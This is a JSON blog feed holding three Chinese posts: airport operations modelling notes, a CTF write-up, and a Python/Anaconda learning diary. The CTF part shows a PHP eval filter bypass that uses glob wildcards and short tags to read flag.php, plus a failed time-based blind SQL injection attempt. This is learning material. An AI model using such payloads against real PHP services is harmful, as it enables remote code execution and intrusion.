            "content_html": "<h2 id=\"问题\"><a class=\"anchor\" href=\"#问题\">#</a> 问题</h2>\n<ol>\n<li>建模问题</li>\n<li>飞机场详细的运营情况</li>\n<li>问题的突破口，大方向</li>\n<li></li>\n</ol>\n<p>收集资料，机场 acdm，如何建立数学模型，分析数据利用技术寻找突破口</p>\n<h5 id=\"机坪动态监控\"><a class=\"anchor\" href=\"#机坪动态监控\">#</a> 机坪动态监控</h5>\n<p>机位动态监控页面直观显示当前机场停机坪上工作状态包括各个机位停靠飞机状态、类型，以及航油车、餐食车等保障车辆信息。</p>\n<p>点击页面上任意机位小飞机图标，可以直接查看该机位对应航班情况和保障状态。 【机位实况】显示当前机场机位占用情况、剩余情况，页面中间显示机位占用明细，页面下方显示保障状态</p>\n<h2 id=\"想法\"><a class=\"anchor\" href=\"#想法\">#</a> 想法</h2>\n<ol>\n<li>对数据分类，根据特殊情况（雨雪天气）</li>\n<li>对流程建模</li>\n<li>找出利用弹性时间</li>\n<li>利用 acdm</li>\n<li>统计规律</li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/qita/%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/",
            "url": "https://mashiro.zone/qita/%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/",
            "title": "",
            "date_published": "2021-03-28T05:08:07.540Z",
            "content_html": "<h2 id=\"解题思路\"><a class=\"anchor\" href=\"#解题思路\">#</a> 解题思路</h2>\n<ol>\n<li>\n<p>easyrce</p>\n<p>首先观察到有 eval 函数可以把字符串作为 PHP 代码执行，所以只要绕过过滤利用这个函数就能 websell</p>\n<p>preg_match 函数执行的是对变量 a 的正则表达式匹配，可以看到没有被过滤的字符有，a？/&gt;&lt;` ' +</p>\n<p>百度搜索到了离别歌的一篇无字母数字 webshell 文章，可以发现主要有俩种方式来绕过</p>\n<p>php 里有 'a'++ =&gt; 'b'，'b'++ =&gt; 'c'... 所以，只要利用 a，通过自增操作即可获得 a-z 中所有字符。</p>\n<p>但是 有长度限制，考虑用数组来绕过 strlen 函数，但定义变量的_也被过滤了，遂放弃。</p>\n<p>第二种方法是利用通配符来绕过，用？来匹配任意字符，也就是说？？？/??? =bin/cat</p>\n<p>所以构造 payload 为？a=' 反引号 <code> /???/?a? ??a?????</code>  反引号 ' 匹配为 bin/cat flag.php, 由于。号被过滤了</p>\n<p>所以尝试用？空格，/ 代替 ，无果</p>\n<p>搭建本地 php 环境测试</p>\n<p>将 flag.php 写入 123 放在同级目录下执行命令，无显示，说明执行失败，感觉是。号的问题</p>\n<p>原来是用短标签闭合，我去</p>\n<p>a=?&gt;&lt;?= ' <code> /???/?a? ??a?????</code> '?&gt;</p>\n</li>\n<li>\n<h4 id=\"ezsqli\"><a class=\"anchor\" href=\"#ezsqli\">#</a> ezsqli</h4>\n<p>首先先用 burp 的爆破模块来测试有没有过滤</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210328104204867.png\" alt=\"image-20210328104204867\" /></p>\n</li>\n</ol>\n<p>​              发现无论什么都是登录密码错误，接着用报错注入试一下，根本没有回显，说明没有开报错，去学习了一下时间盲注，就是利用 if 语句和 sheep 函数来不断判断确定数据库的名称</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210328105246522.png\" alt=\"image-20210328105246522\" /></p>\n<p>先测试一下有没有注入点，发现返回时间并没有什么变化，应该是有过滤</p>\n<p>不管了去找了一个时间盲注的 python 脚本改了 url 跑了跑，无果。</p>\n<p>心态略崩</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/BigData/",
            "url": "https://mashiro.zone/BigData/",
            "title": "python数据分析",
            "date_published": "2021-03-27T09:17:10.000Z",
            "content_html": "<h2 id=\"python数据分析学习\"><a class=\"anchor\" href=\"#python数据分析学习\">#</a> python 数据分析学习</h2>\n<h3 id=\"day-1\"><a class=\"anchor\" href=\"#day-1\">#</a> day 1</h3>\n<p>在这些数据之中隐藏着无数问题的答案，这些问题从没有人提出过</p>\n<hr />\n<p><strong>数据科学</strong>（英语：<strong>data science</strong>）是一门利用数据学习知识的学科，其目标是通过从数据中提取出有价值的部分来生产数据产品 [<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTk1JUIwJUU2JThEJUFFJUU3JUE3JTkxJUU1JUFEJUE2I2NpdGVfbm90ZS0x\">1]</span>。它结合了诸多领域中的理论和技术，包括<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JUJBJTk0JUU3JTk0JUE4JUU2JTk1JUIwJUU1JUFEJUE2\">应用数学</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUJCJTlGJUU4JUFFJUEx\">统计</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JUE4JUExJUU1JUJDJThGJUU4JUFGJTg2JUU1JTg4JUFC\">模式识别</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTlDJUJBJUU1JTk5JUE4JUU1JUFEJUE2JUU0JUI5JUEw\">机器学习</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTk1JUIwJUU2JThEJUFFJUU1JThGJUFGJUU4JUE3JTg2JUU1JThDJTk2\">数据可视化</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTk1JUIwJUU2JThEJUFFJUU0JUJCJTkzJUU1JUJBJTkz\">数据仓库</span>以及<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU5JUFCJTk4JUU2JTgwJUE3JUU4JTgzJUJEJUU4JUE4JTg4JUU3JUFFJTk3\">高性能计算</span>。数据科学通过运用各种相关的数据来帮助非专业人士理解问题。 数据科学技术可以帮助我们如何正确的处理数据并协助我们在<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JTk0JTlGJUU3JTg5JUE5JUU1JUFEJUE2\">生物学</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUE0JUJFJUU0JUJDJTlBJUU3JUE3JTkxJUU1JUFEJUE2\">社会科学</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJBJUJBJUU3JUIxJUJCJUU1JUFEJUE2\">人类学</span>等领域进行研究调研。此外，数据科学也对商业竞争有极大的帮助 [<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTk1JUIwJUU2JThEJUFFJUU3JUE3JTkxJUU1JUFEJUE2I2NpdGVfbm90ZS0y\">2]</span>。</p>\n<hr />\n<p>用 anaconda 重新安装 python 环境，之后命令行默认使用的是 conda 自带的 python 环境，与原来安装的 python 并不冲突</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNTAwOTE1Ng==\">Anaconda 的环境部署</span></p>\n<p>打开 anaconda 命令行工具</p>\n<ol>\n<li>\n<p>使用 Ipython（一个 python 的交互式 shell）</p>\n</li>\n<li>\n<p>设置清华源可以加速下载包</p>\n</li>\n</ol>\n<blockquote>\n<p>conda:</p>\n<p>conda config --add channels <span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2FuYWNvbmRhL2Nsb3VkL2NvbmRhLWZvcmdlLw==\">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span><br />\nconda config --add channels <span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2FuYWNvbmRhL3BrZ3MvZnJlZS8=\">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br />\nconda config --add channels <span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2FuYWNvbmRhL3BrZ3MvbWFpbi8=\">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br />\nconda config --append channels <span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2FuYWNvbmRhL2Nsb3VkL2Zhc3RhaS8=\">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/fastai/</span><br />\nconda config --append channels <span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2FuYWNvbmRhL2Nsb3VkL3B5dG9yY2gv\">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span><br />\nconda config --append channels <span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2FuYWNvbmRhL2Nsb3VkL2Jpb2NvbmRhLw==\">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/</span><br />\nconda config --set show_channel_urls yes</p>\n</blockquote>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210327205259195.png\" alt=\"\" /></p>\n<h3 id=\"使用conda设置虚拟环境\"><a class=\"anchor\" href=\"#使用conda设置虚拟环境\">#</a> 使用 conda 设置虚拟环境</h3>\n<p>conda create -n kr python=3.6 创建 python3.6 环境</p>\n<p>conda activate kr 进入虚拟环境</p>\n<p>deactivate 离开虚拟环境</p>\n<p>conda env list 列出环境</p>\n<p>conda  env remove -n env_name</p>\n<h2 id=\"jupyer-notebook\"><a class=\"anchor\" href=\"#jupyer-notebook\">#</a> Jupyer  Notebook</h2>\n<ul>\n<li>是一个基于网页的交互式笔记本，支持多种编程语言</li>\n<li>anaconda 命令行输入 jupter notebook 即可打开</li>\n<li>文件会被创建在你打开的目录下</li>\n</ul>\n<p>shift+enter 执行代码</p>\n<p>第一天结束，摸摸：），主要完成了环境配置与一些书籍收集整理</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210327215347531.png\" alt=\"image-20210327215347531\" /></p>\n<h3 id=\"day-2\"><a class=\"anchor\" href=\"#day-2\">#</a> day 2</h3>\n<h2 id=\"jupyter-的使用\"><a class=\"anchor\" href=\"#jupyter-的使用\">#</a> jupyter 的使用</h2>\n<p>tab 自动补全</p>\n<p>B 键在下方新建代码块，A 在上方</p>\n<p>？可以看到函数参数</p>\n<p>魔术命令：</p>\n<p>%pwd</p>\n<p>%matplotlib inline</p>\n<p>%timeit</p>\n<p>可以远程访问 jupyter</p>\n<h3 id=\"day3\"><a class=\"anchor\" href=\"#day3\">#</a> day3</h3>\n<p>python 正则表达式</p>\n",
            "tags": []
        }
    ]
}